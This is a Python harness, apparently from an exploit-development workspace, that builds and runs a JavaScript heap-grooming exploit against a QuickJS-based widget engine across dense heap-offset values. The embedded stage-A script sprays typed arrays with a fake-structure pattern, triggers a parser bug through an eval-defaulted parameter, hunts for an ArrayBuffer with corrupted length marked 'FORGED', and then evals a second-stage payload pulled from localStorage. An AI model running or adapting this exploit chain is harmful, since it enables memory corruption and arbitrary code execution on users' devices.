#!/usr/bin/env python3
"""Host H-matrix for the preserve-length padded rewrites.

Models the widget engine pre-heap with a JS string of the padded HTML length
allocated before the stage-A script (the engine allocates the HTML payload;
the stage-A script source is compiled from it).  Runs the exact stage-A
sources (2,036 no-S2LEN and 2,174 S2LEN) at dense H values.
"""
import json, os, re, subprocess, sys

HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE)
PAT=("[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,"
     "255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255]")
SRC=('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; '
     'return ' + '+'.join(['1.5']*34) + '; })')

def stage_a(H,N=3000,HN=64,VK0=598,s2len=False):
    tail=('var s2=null; try{s2=localStorage.getItem("n1s2");}catch(e){}\n'
          + ('globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);\n'
             'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n' if s2len else '')
          + 'if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }')
    return f'''"use strict";
var N={N},H={H},HN={HN},VK={VK0};
var PAT={PAT};
if (globalThis.PAT !== PAT) {{
  globalThis.RESULT="RESULT NO_TOPS";
  try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
}} else {{
var S=new Array(N),fb=new Uint8Array(40);
for(var j=0;j<40;j++)fb[j]=PAT[j];
for(var i=0;i<N;i++){{var u=new Uint8Array(957);S[i]=u;}}
for(var k=0;k<HN;k++)S[H+k]=null;
globalThis.f=(0,eval)({SRC!r});
var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
var TN=600,T=new Array(TN),TV=new Array(TN);
for(var i=0;i<TN;i++){{T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}}
var PH=[4,12,20,28,36],VKS=[{VK0},{VK0}-10,{VK0}-20,{VK0}-30,{VK0}-40];
var hit=-1,len=0,ph=-1,vk=-1,nt=0;
for(var pi=0;pi<5&&hit<0;pi++){{
  var p=PH[pi];
  for(var i=0;i<N;i++){{if(S[i]){{for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}}}
  for(var vi=0;vi<5&&hit<0;vi++){{
    var v=VKS[vi]; if(v<16) continue;
    for(var r=0;r<8;r++){{var j=v-2*r;T[j]=null;TV[j]=null;}}
    try{{f();}}catch(e){{}}
    nt++;
    for(var i=0;i<TN;i++){{if(T[i]!==null&&T[i].byteLength!==72){{hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}}}
  }}
}}
if(hit>=0){{globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}}
globalThis.RESULT="RESULT LS C=34 SZ=957 N={N} H={H} HN={HN} HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
globalThis.N1MARK=globalThis.RESULT;
try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
try{{console.log("N1A:"+globalThis.RESULT);}}catch(e){{}}
{tail}
}}
'''

def run(padded_len, H, s2len, storage_len):
    a=stage_a(H,s2len=s2len)
    d=('var HTMLPRE="A"+("a".repeat('+str(padded_len)+'-1));globalThis.HTMLPRE=HTMLPRE;\n'
       'var __v={textContent:""};\n'
       'globalThis.document={getElementById:function(id){if(id==="v")return __v;return null;}};\n'
       'globalThis.localStorage={getItem:function(k){return "/*"+"A".repeat('+str(max(4,storage_len-4))+')+"*/";},setItem:function(k,v){}};\n'
       +a+'\nglobalThis.RESULT="DRIVER "+globalThis.RESULT+" V="+__v.textContent;\n')
    open('/tmp/opencode/pad_driver.js','w').write(d)
    p=subprocess.run(['/tmp/opencode/qjs017/build/app_multi','/tmp/opencode/pad_driver.js'],capture_output=True,text=True,env={**os.environ,'QJS_HEAP_LIMIT':'8388608'})
    txt=p.stderr+p.stdout; m=re.search(r'(LS C=34[^\n]*)',txt)
    return p.returncode, m.group(1) if m else 'NO_RESULT'

def main():
    import argparse
    ap=argparse.ArgumentParser(); ap.add_argument('--padded',type=int,nargs='+',default=[3243,3969,3974])
    ap.add_argument('--H',type=int,nargs='+',default=list(range(0,601,50)))
    ap.add_argument('--s2len',type=int,nargs='+',default=[0,1])
    ap.add_argument('--storage',type=int,nargs='+',default=[2903,3617])
    args=ap.parse_args()
    for pl in args.padded:
        for sl in args.s2len:
            for st in args.storage:
                print(f'## padded={pl} s2len={sl} storage={st}')
                for H in args.H:
                    rc,res=run(pl,H,bool(sl),st)
                    print(f'H={H} rc={rc} {res}')
if __name__=='__main__': main()
